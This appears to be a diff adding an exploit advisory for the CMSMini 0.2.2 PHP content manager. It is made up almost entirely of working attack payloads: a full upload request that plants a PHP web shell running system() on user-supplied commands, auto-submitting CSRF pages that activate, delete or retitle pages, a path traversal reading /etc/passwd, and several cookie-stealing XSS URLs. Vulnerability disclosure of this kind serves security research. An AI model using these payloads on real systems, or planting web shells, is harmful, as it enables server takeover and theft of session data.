@@ -1,0 +1,107 @@
+------------------------------------------------------------------------------------------
+# Exploit Title: CMSMini - Multiple Vulnerability
+# Author: SANTHO (@s4n7h0)
+# Vendor Homepage: http://sourceforge.net/projects/cmsmini/
+# Download link:
+downloads.sourceforge.net/project/cmsmini/cmsmini/cmsmini-0.2.2/cmsmini-0.2.2.tar.gz
+# Category: CMS/Webapps/PHP
+# Version: 0.2.2 + older
+------------------------------------------------------------------------------------------
+
+File Upload
+^^^^^^^^^^^^^^
+URL : http://[target/IP]/cmsmini/admin/index.php?path=&op=newitem
+POST /cmsmini/admin/index.php?path=&op=newitem HTTP/1.1
+Host: 192.168.15.162
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101
+Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.15.162/cmsmini/admin/index.php?path=
+Cookie: PHPSESSID=in6suoa2o1q8ilrtgovjdtcl52
+Connection: keep-alive
+Content-Type: multipart/form-data;
+boundary=---------------------------219313096530417
+Content-Length: 1130
+
+-----------------------------219313096530417
+Content-Disposition: form-data; name="imagefile"; filename="cmd.php"
+Content-Type: application/octet-stream
+
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
+
+# The uploaded shell can be accessible http://
+[target/IP]/cmsmini/pages/cmd.php
+
+Activate Page by CSRF
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[target/IP]/cmsmini/admin/index.php?path=&op=status&name=cmd.php&newstatus=1"
+method="GET" name="form">
+</form>
+</body>
+</html>
+
+Delete Page by CSRF
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[target/IP]/cmsmini/admin/index.php?path=&op=del&name=cmd.php"
+method="GET" name="form">
+</form>
+</body>
+</html>
+
+Change Page Title by CSRF
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[target/IP]/cmsmini/admin/save.php?what=title&path=&p=testing.html"
+method="post" name="form">
+<input type="hidden" name="content" value="HelloWorld">
+<input type="hidden" name="title" value="Changed_Title">
+</form>
+</body>
+</html>
+
+File Inclusion
+^^^^^^^^^^^^^^^^^
+http://
+[target/IP]/cmsmini/admin/edit.php?path=&name=../../../../../etc/passwd
+
+Multiple Cross Site Scripting
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+http://
+[target/IP]/cmsmini/admin/?path=%22%20%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://
+[target/IP]/cmsmini/admin/configure.php?path=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+http://
+[target/IP]/cmsmini/admin/configure.php?path=&name=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+http://
+[target/IP]/cmsmini/admin/edit.php?path=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E&name=testing.html
+http://
+[target/IP]/cmsmini/admin/edit.php?path=&name=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+http://
+[target/IP]/cmsmini/admin/index.php?path=%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+
+-- 
+SANTHO
+twitter : @s4n70 <https://twitter.com/s4n7h0>
